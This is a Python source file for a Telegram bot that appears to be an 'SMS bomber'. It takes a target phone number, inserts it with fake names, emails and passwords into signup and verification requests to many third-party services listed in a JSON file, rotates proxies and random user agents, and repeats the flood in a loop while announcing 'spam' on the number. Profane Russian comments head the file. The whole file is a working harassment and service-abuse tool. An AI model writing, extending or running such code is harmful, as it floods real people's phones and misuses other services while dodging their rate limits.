#НЕ ТРОЖ ЭТО НА БУДУЩЕЕ!!!!!!!!!!!
#ПОНЯЛ?????????_______________ТРОНЕШЬ УЕБУ
#АЗАЗАЗАЗЗАЗА
#ДА ЭТО СТАРЫЙ КОД ТУТ И ЧТО?
#Я ТАК ЗАЕБАЛСЯ С АСИНХРОНОМ
#А ТЫ ЧТО? ИДИ ПИХАЙ СЕРВИСЫ ХУЛИ СМОТРИШЬ
#ТЕСТИРОВАТЬ ААААААААААААААААААААААААААААА
#
#
#
#
#
#
#
#
#
#
#




















import asyncio
import aiohttp
from aiogram import Bot, types
import json
import random
#=====================>
import _subfiles.logic.numberTools
numberTools = _subfiles.logic.numberTools
def getServices(file='./_subfiles/json/services.json'):
    with open(file, 'r') as services:
        return json.load(services)["services"]

def getDomain(url):
    return url.split('/')[2]

class Service:
    def __init__(self, service):
        self.service = service
        
        self.timeout = 4

    def parseData(self, phone):
        payload = None
        try:
            dataType = "get"
            payload = self.service["data"]
        except KeyError:
            pass
        try:
            dataType = "data"
            payload = self.service["data"]
        except KeyError:
            pass

        try:
            dataType = "json"
            payload = self.service["json"]
        except KeyError:
            pass
        if not payload:
            payload = json.dumps({"url": self.service["url"]})
            dataType = "url"

        for old, new in {
            "\'": "\"",
            "%phone%": phone,
            "%phoneg%": numberTools.transformPhone2(phone),
            "%phone8%": numberTools.normalize8(phone),
            "%+phone%": numberTools.plusnumber(phone),
            "%phone9%": numberTools.normalize9(phone),
            "%phone6%": numberTools.transformPhone1(phone),
            "%phone5%": numberTools.transformPhone(phone, 5),
            "%name%": numberTools.random_name(),
            "%email%": numberTools.random_email(),
            "%password%": numberTools.random_password()
        }.items():
            payload = payload.replace(old, new)
        return (json.loads(payload), dataType)

    async def sendMessage(self, phone):
        url = self.service["url"]
        payload, dataType = self.parseData(phone)

        headers = {
            "X-Requested-With": "XMLHttpRequest",
            "Connection": "keep-alive",
            "Pragma": "no-cache",
            "Cache-Control": "no-cache",
            "Accept-Encoding": "gzip, deflate, br",
            "User-agent": numberTools.random_useragent()
        }

        try:
            customHeaders = self.service["headers"]
        except KeyError:
            pass
        else:
            for key, value in json.loads(customHeaders.replace("\'", "\"")).items():
                headers[key] = value
        print("hui")
        okay = " Service (" + getDomain(url) + ") >> Message sent!"
        error = " Service (" + getDomain(url) + ") >> Failed to sent message!"

        proxy_list = open("./_subfiles/proxy/proxy.txt")
        proxies = []
        for line in proxy_list:
            proxi = ''.join(line)
            proxi = (''+proxi).split()
            proxies.append(proxi)
        proxy = random.choice(proxies)
        proxy = ''.join(proxy)
        proxy = {"HTTP":proxy}
        #try:
        print(proxy)
        async with aiohttp.ClientSession() as session:
            if dataType != "get":
                if dataType == "json":
                    async with session.post(url, json=payload, timeout=self.timeout, headers=headers, proxy=proxy) as response:
                        print("JSON"+str(url))
                        print("Status:", await response.status)
                elif dataType == "data":
                    async with session.post(url, data=payload, timeout=self.timeout, headers=headers, proxy=proxy) as response:
                        print("DATA"+str(url))
                        print("Status:", await response.status)
                elif dataType == "params":
                    async with session.post(url, params=payload, timeout=self.timeout, headers=headers, proxy=proxy) as response:
                        print("PARAMS"+str(url))
                        print("Status:", await response.status)
                elif dataType == "url":
                    async with session.post(payload["url"], timeout=self.timeout, headers=headers, proxy=proxy) as response:
                        print("URL"+str(url))
                        print("Status:", await response.status)
            else:
                async with session.get(payload["url"], timeout=self.timeout, headers=headers, proxy=proxy) as response:
                    print("Status:", await response.status)
        #except:
           # print("1")   
         

async def send_request(UserID, ThreadNum, bot, phone):
    services = getServices()
    await bot.send_message(UserID,"[#] Начат спам на номер: " + phone + ", чтобы остановить спам нажмите кнопку! ")

    async def spam_gg():
        true_pidor = 0
        pidor2 = 0
        
        for i in services:
            service = i
            print(service)
            service = Service(service)
            await service.sendMessage(phone)
        
    for i in range(ThreadNum):
        await spam_gg()
        
